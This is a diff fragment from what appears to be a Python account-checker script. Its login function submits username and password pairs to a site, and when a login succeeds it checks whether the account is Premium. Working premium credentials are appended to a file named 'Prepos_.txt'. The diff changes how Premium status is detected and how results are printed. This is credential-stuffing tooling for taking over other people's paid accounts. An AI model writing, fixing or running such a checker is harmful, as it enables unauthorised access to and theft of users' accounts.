@@ -76,14 +76,12 @@ def login(xsrf_token, session_cookie, headers, base_url, ses, user, passwd, retr
                 if '{"status":true,"mess":"Successfully Login"}' in login_response.text:
                     print(yellow + '[*] Success Login....' + reset)
                     account_response = ses.get(base_url + '/account', headers=headers, timeout=10)
-                    regex = re.findall('<span class="label label-danger white pull-left">(.*?)</span>', account_response.content)
-                    print(yellow + '[-]' + base_url + ':' + user + ':' + passwd + " => " + reset + green + str(regex[0]) + reset)
-                    print('\n-------------------------------')
-                    if 'Premium' in regex:
-                        print('[=] Saved Premium Account')
-                        open('Prepos_.txt', 'a').write('\n--------Premium---------\n' + base_url + '/login' + '|' + user + '|' + passwd + '\n-----------------\n')
+                    if '<span class="label label-success white pull-left">Premium</span>' in account_response.content:
+                    	print(yellow + '[-]' + base_url + ':' + user + ':' + passwd + " => " + reset + green + " => Premium " + reset)
+                    	print('\n-------------------------------')
+                    	open('Prepos_.txt', 'a').write('\n--------Premium---------\n' + base_url + '/login' + '|' + user + '|' + passwd + '\n-----------------\n')
                     else:
-                        print('[=] Its Free Account')
+                    	print(red + '[!] Free Account....' + reset)
                 else:
                     print(red + '[x] BAD Login....' + reset)
                     print('\n-------------------------------')
